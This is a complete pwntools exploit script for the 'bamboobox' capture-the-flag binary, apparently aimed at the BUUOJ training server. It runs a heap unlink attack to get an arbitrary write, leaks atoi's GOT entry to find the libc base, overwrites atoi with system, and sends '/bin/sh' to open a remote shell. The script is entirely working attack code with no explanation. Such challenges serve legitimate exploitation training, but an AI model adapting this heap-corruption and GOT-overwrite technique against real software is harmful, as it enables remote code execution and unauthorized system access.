from os import system
from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('bamboobox')
io = remote('node4.buuoj.cn', 27823)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('bamboobox')
itemlist = 0x6020C0
atoi_got = elf.got['atoi']


def show():
    io.sendlineafter('Your choice:', '1')


def add(size, content):
    io.sendlineafter('Your choice:', '2')
    io.sendlineafter('Please enter the length of item name:', str(size))
    io.sendafter('Please enter the name of item:', content)


def edit(index, size, content):
    io.sendlineafter('Your choice:', '3')
    io.sendlineafter('Please enter the index of item:', str(index))
    io.sendlineafter('Please enter the length of item name:', str(size))
    io.sendafter('Please enter the new name of the item:', content)


def delete(index):
    io.sendlineafter('Your choice:', '4')
    io.sendlineafter('Please enter the index of item:', str(index))


def unlink():
    add(0x28, '0\n')
    add(0x88, '1\n')
    fd, bk = itemlist - 0x10, itemlist - 8
    payload = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20) + p8(0x90)
    edit(0, 0x29, payload)
    delete(1)


def pwn():
    payload = cyclic(0x10) + p64(8) + p64(atoi_got)
    edit(0, 0x20, payload)
    show()
    libc_base = u64(io.recvn(10)[-6:].ljust(8, b'\x00')) - libc.sym['atoi']
    log.success('libc_base: ' + hex(libc_base))
    system = libc_base + libc.sym['system']
    edit(0, 8, p64(system))
    io.sendafter('Your choice:', b'/bin/sh\x00')
    io.interactive()


if __name__ == '__main__':
    unlink()
    pwn()
